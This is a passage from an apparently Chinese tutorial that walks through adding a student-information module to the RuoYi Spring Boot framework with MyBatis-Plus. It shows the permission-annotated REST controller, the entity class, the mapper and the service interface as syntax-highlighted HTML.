<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>access<span class="token punctuation">.</span>prepost<span class="token punctuation">.</span></span><span class="token class-name">PreAuthorize</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DeleteMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PutMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestBody</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Log</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>controller<span class="token punctuation">.</span></span><span class="token class-name">BaseController</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">AjaxResult</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>page<span class="token punctuation">.</span></span><span class="token class-name">TableDataInfo</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>enums<span class="token punctuation">.</span></span><span class="token class-name">BusinessType</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>poi<span class="token punctuation">.</span></span><span class="token class-name">ExcelUtil</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">SysStudent</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ISysStudentService</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 学生信息Controller
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/system/student"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysStudentController</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">ISysStudentService</span> sysStudentService<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 查询学生信息列表
     */</span>
    <span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:student:list')"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/list"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">TableDataInfo</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">SysStudent</span> sysStudent<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token function">startPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> sysStudentService<span class="token punctuation">.</span><span class="token function">queryList</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">getDataTable</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 导出学生信息列表
     */</span>
    <span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:student:export')"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"学生信息"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>EXPORT<span class="token punctuation">)</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/export"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token class-name">SysStudent</span> sysStudent<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> sysStudentService<span class="token punctuation">.</span><span class="token function">queryList</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysStudent</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> util<span class="token punctuation">.</span><span class="token function">exportExcel</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 获取学生信息详细信息
     */</span>
    <span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:student:query')"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/{studentId}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"studentId"</span><span class="token punctuation">)</span> <span class="token class-name">Long</span> studentId<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>sysStudentService<span class="token punctuation">.</span><span class="token function">getById</span><span class="token punctuation">(</span>studentId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 新增学生信息
     */</span>
    <span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:student:add')"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"学生信息"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>INSERT<span class="token punctuation">)</span>
    <span class="token annotation punctuation">@PostMapping</span>
    <span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">SysStudent</span> sysStudent<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">toAjax</span><span class="token punctuation">(</span>sysStudentService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 修改学生信息
     */</span>
    <span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:student:edit')"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"学生信息"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>UPDATE<span class="token punctuation">)</span>
    <span class="token annotation punctuation">@PutMapping</span>
    <span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">SysStudent</span> sysStudent<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">toAjax</span><span class="token punctuation">(</span>sysStudentService<span class="token punctuation">.</span><span class="token function">updateById</span><span class="token punctuation">(</span>sysStudent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 删除学生信息
     */</span>
    <span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:student:remove')"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"学生信息"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span>
    <span class="token annotation punctuation">@DeleteMapping</span><span class="token punctuation">(</span><span class="token string">"/{studentIds}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> studentIds<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">toAjax</span><span class="token punctuation">(</span>sysStudentService<span class="token punctuation">.</span><span class="token function">removeByIds</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>studentIds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>新增 <strong>ruoyi-system\com\ruoyi\system\domain\SysStudent.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">ToStringBuilder</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">ToStringStyle</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">IdType</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">TableField</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">TableId</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">TableName</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonFormat</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Excel</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 学生信息对象 sys_student
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@TableName</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"sys_student"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysStudent</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@TableField</span><span class="token punctuation">(</span>exist <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token comment">/** 编号 */</span>
    <span class="token annotation punctuation">@TableId</span><span class="token punctuation">(</span>type <span class="token operator">=</span> <span class="token class-name">IdType</span><span class="token punctuation">.</span>AUTO<span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Long</span> studentId<span class="token punctuation">;</span>

    <span class="token comment">/** 学生名称 */</span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"学生名称"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> studentName<span class="token punctuation">;</span>

    <span class="token comment">/** 年龄 */</span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"年龄"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> studentAge<span class="token punctuation">;</span>

    <span class="token comment">/** 爱好（0代码 1音乐 2电影） */</span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"爱好"</span><span class="token punctuation">,</span> readConverterExp <span class="token operator">=</span> <span class="token string">"0=代码,1=音乐,2=电影"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> studentHobby<span class="token punctuation">;</span>

    <span class="token comment">/** 性别（0男 1女 2未知） */</span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"性别"</span><span class="token punctuation">,</span> readConverterExp <span class="token operator">=</span> <span class="token string">"0=男,1=女,2=未知"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> studentSex<span class="token punctuation">;</span>

    <span class="token comment">/** 状态（0正常 1停用） */</span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"状态"</span><span class="token punctuation">,</span> readConverterExp <span class="token operator">=</span> <span class="token string">"0=正常,1=停用"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> studentStatus<span class="token punctuation">;</span>

    <span class="token comment">/** 生日 */</span>
    <span class="token annotation punctuation">@JsonFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"生日"</span><span class="token punctuation">,</span> width <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">,</span> dateFormat <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">Date</span> studentBirthday<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentId</span><span class="token punctuation">(</span><span class="token class-name">Long</span> studentId<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentId <span class="token operator">=</span> studentId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Long</span> <span class="token function">getStudentId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentName</span><span class="token punctuation">(</span><span class="token class-name">String</span> studentName<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentName <span class="token operator">=</span> studentName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getStudentName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> studentAge<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentAge <span class="token operator">=</span> studentAge<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getStudentAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentAge<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentHobby</span><span class="token punctuation">(</span><span class="token class-name">String</span> studentHobby<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentHobby <span class="token operator">=</span> studentHobby<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getStudentHobby</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentHobby<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentSex</span><span class="token punctuation">(</span><span class="token class-name">String</span> studentSex<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentSex <span class="token operator">=</span> studentSex<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getStudentSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentSex<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentStatus</span><span class="token punctuation">(</span><span class="token class-name">String</span> studentStatus<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentStatus <span class="token operator">=</span> studentStatus<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getStudentStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentStatus<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentBirthday</span><span class="token punctuation">(</span><span class="token class-name">Date</span> studentBirthday<span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>studentBirthday <span class="token operator">=</span> studentBirthday<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Date</span> <span class="token function">getStudentBirthday</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> studentBirthday<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBuilder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token class-name">ToStringStyle</span><span class="token punctuation">.</span>MULTI_LINE_STYLE<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentId"</span><span class="token punctuation">,</span> <span class="token function">getStudentId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentName"</span><span class="token punctuation">,</span> <span class="token function">getStudentName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentAge"</span><span class="token punctuation">,</span> <span class="token function">getStudentAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentHobby"</span><span class="token punctuation">,</span> <span class="token function">getStudentHobby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentSex"</span><span class="token punctuation">,</span> <span class="token function">getStudentSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentStatus"</span><span class="token punctuation">,</span> <span class="token function">getStudentStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"studentBirthday"</span><span class="token punctuation">,</span> <span class="token function">getStudentBirthday</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>新增 <strong>ruoyi-system\com\ruoyi\system\mapper\SysStudentMapper.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>mapper</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>core<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">BaseMapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">SysStudent</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 学生信息Mapper接口
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">SysStudentMapper</span> <span class="token keyword">extends</span> <span class="token class-name">BaseMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>

<span class="token punctuation">}</span>
</code></pre>
<p>新增 <strong>ruoyi-system\com\ruoyi\system\service\ISysStudentService.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>extension<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">IService</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">SysStudent</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 学生信息Service接口
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ISysStudentService</span> <span class="token keyword">extends</span> <span class="token class-name">IService</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>
    <span class="token comment">/**
     * 查询学生信息列表
     * 
     * @param sysStudent 学生信息
     * @return 学生信息集合
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysStudent</span><span class="token punctuation">&gt;</span></span> <span class="token function">queryList</span><span class="token punctuation">(</span><span class="token class-name">SysStudent</span> sysStudent<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>新增 <strong>ruoyi-system\com\ruoyi\system\service\impl\SysStudentServiceImpl.java</strong></p>
